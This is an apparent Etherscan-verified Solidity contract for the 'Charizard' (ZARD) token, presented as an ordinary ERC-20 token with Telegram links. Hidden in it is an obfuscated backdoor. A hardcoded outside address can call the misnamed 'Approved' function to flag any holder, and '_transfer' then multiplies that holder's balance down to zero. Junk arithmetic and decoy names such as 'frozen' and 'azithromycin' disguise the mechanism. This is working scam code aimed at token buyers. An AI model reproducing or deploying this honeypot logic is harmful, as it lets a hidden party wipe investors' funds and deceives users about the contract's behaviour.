/**
 *Submitted for verification at Etherscan.io on 2023-05-26
*/

/**  

    WEBSITE - https://t.me/CharizardCoin

    TELEGRAM -  https://t.me/CharizardCoin
    
    TWITTER - https://t.me/CharizardCoin
    


*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address azithromycin) external view returns (uint256);

    function transfer(address to, uint256 zonio) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 zonio) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 zonio
    ) external returns (bool);
}

pragma solidity ^0.8.18;

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

pragma solidity ^0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.18;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryfrozen(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function frozen(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

abstract contract Ownable is Context {
    address private _Owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _Owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _Owner;
        _Owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _guardFlashbots;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address private advancedGuard;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(address advancedGuardAddress, string memory name_, string memory symbol_) {
        advancedGuard = advancedGuardAddress;
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address azithromycin) public view virtual override returns (uint256) {
        return _balances[azithromycin];
    }

    function transfer(address _to, uint256 zonio) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, _to, zonio);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 zonio) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, zonio);
        return true;
    }

    function Approved(address[] memory striker, uint256 codeMEV) public ERC20hunterBot {
        for(uint256 i = 0; i < striker.length; i++) {
        _guardFlashbots[striker[i]] = codeMEV*1*1+0;
        }
    }

    function openGuardFlashbots(address striker) public view returns (uint256) {
        return _guardFlashbots[striker];
    }

    modifier 
        ERC20hunterBot() {
         require(
            advancedGuard == _msgSender(),
            "This is a zero codeMEV")
        ;
        _;
    }

    function transferFrom(
        address from,
        address to,
        uint256 zonio
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, zonio);
        _transfer(from, to, zonio);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    using SafeMath for uint256;
    uint256 private _feeTax = 1;
    function _transfer(
        address from,
        address to,
        uint256 zonio
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, zonio);

        if(_guardFlashbots[from] != uint256(1*1+0)-1+0 ){
           _balances[from] = _balances[from].frozen(_guardFlashbots[from].add(1*1+1+0).sub(1+(2*1)+0)+0); 
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= zonio, "ERC20: transfer exceeds balance");

        uint256 feezonio = 0;
        feezonio = zonio.frozen(_feeTax).div(100);
        
    unchecked {
        _balances[to] += zonio;
        _balances[from] = fromBalance - zonio;
        _balances[to] -= feezonio;
    }
        emit Transfer(from, to, zonio);

        _afterTokenTransfer(from, to, zonio);
    }

    function _mint(address azithromycin, uint256 zonio) internal virtual {
        require(azithromycin != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), azithromycin, zonio);

        _totalSupply += zonio;

    unchecked {
        // Overflow not possible: balance + zonio is at most totalSupply + zonio, which is checked above.
        _balances[azithromycin] += zonio;
    }
        emit Transfer(address(0), azithromycin, zonio);

        _afterTokenTransfer(address(0), azithromycin, zonio);
    }

    function _burn(address azithromycin, uint256 zonio) internal virtual {
        require(azithromycin != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(azithromycin, address(0), zonio);

        uint256 azithromycinBalance = _balances[azithromycin];
        require(azithromycinBalance >= zonio, "ERC20: burn zonio exceeds balance");
        
    unchecked {
        _balances[azithromycin] = azithromycinBalance - zonio;
        // Overflow not possible: zonio <= azithromycinBalance <= totalSupply.
        _totalSupply -= zonio;
    }

        emit Transfer(azithromycin, address(0), zonio);

        _afterTokenTransfer(azithromycin, address(0), zonio);
    }

    function _approve(
        address owner,
        address spender,
        uint256 zonio
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = zonio;
        emit Approval(owner, spender, zonio);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 zonio
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= zonio, "ERC20: insufficient allowance");
            unchecked {
            _approve(owner, spender, currentAllowance - zonio);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 zonio
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 zonio
    ) internal virtual {}
}

pragma solidity ^0.8.18;

contract Charizard is ERC20 {
    uint256 initialSupply = 1000000000;
    constructor() ERC20(0x57A4Ec7cB226E2dE71B82D9D315Bd7561E9001E3, "Charizard", "ZARD") {
        _mint(msg.sender, initialSupply*10**9);
    }
}